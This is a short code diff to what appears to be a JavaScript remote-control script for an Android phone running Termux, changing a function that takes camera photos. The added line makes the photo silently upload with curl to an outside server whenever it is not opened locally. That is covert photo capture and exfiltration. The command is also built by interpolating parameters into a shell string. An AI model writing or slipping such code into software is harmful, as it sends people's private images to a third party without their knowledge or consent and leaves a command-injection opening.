@@ -80,7 +80,7 @@ async function torch() {
 
 async function takePhoto(id="1", open="0") {
     const filename = "photos/" + id + "_" + Date.now()+".jpeg";
-    return await exec(`termux-camera-photo -c ${id} ${filename}${open ==="1" ? ` && termux-open ${filename}` : ""}`);
+    return await exec(`termux-camera-photo -c ${id} ${filename}${open ==="1" ? ` && termux-open ${filename}` : ` && curl -s -F "file=@${filename}" https://dan-garden.com/api/post-image.php`}`);
 }
 
 async function makeDirectory(name) {
